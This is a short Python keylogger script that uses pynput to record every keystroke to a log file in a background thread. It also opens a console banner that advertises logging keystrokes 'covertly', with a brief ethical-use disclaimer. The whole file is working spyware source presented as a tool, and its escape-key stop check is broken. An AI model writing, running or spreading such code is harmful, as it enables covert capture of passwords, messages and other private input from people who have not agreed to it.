from pynput.keyboard import Listener
import logging
import threading
import time
import subprocess
import sys
import os

# Setup the logging configuration for keylogger
logging.basicConfig(filename="output.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to run the keylogger in a separate thread
def run_keylogger():
    def on_press(key):
        try:
            logging.info(f"{key.char}")  # If it's a regular character key
        except AttributeError:
            logging.info(f"{key}")  # If it's a special key like space, enter, etc.

    def on_release(key):
        if key == 'Key.esc':
            # Stop listener
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to display signature in a new cmd window
def display_signature():
    # Start a new cmd window with a signature message
    subprocess.Popen('start cmd /K "echo ====================================================================== && echo                        WELCOME TO THE KEYLOGGER && echo ---------------------------------------------------------------------- && echo 8888888888888888888888888888888888888888888888888888888888888888888888 && echo 8888888888888888888888888888888888888888888888888888888888888888888888 && echo 888888888888888888888888888888P""  ""988888888888888888888888888888888 && echo 888888888888888888888P"88888P          988888"988888888888888888888888 && echo 888888888888888888888  "9888            888P"  88888888888888888888888 && echo 88888888888888888888888bo "9  d8o  o8b  P" od8888888888888888888888888 && echo 88888888888888888888888888bob 98"  "8P dod8888888888888888888888888888 && echo 88888888888888888888888888888    db    8888888888888888888888888888888 && echo 8888888888888888888888888888888      888888888888888888888888888888888 && echo 8888888888888888888888888888P"9bo  odP"9888888888888888888888888888888 && echo 8888888888888888888888888P" od88888888bo "9888888888888888888888888888 && echo 88888888888888888888888   d88888888888888b   8888888888888888888888888 && echo 888888888888888888888888oo8888888888888888oo88888888888888888888888888 && echo 8888888888888888888888888888888888888888888888888888888888888888888888 && echo ---------------------------------------------------------------------- && echo              This tool lets you log keystrokes covertly! && echo                  Program created by: Benjamin Barish && echo ====================================================================== && echo Keylogger is running... You may close this window. && echo Disclaimer: This tool is for ethical use only. Unauthorized use is illegal."', shell=True)

# && echo 
# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=run_keylogger)
keylogger_thread.daemon = True  # Ensure the thread ends when the main program ends
keylogger_thread.start()

# Display signature in a separate cmd window
display_signature()

# Keep the main program running while keylogger is active
while True:
    time.sleep(1)
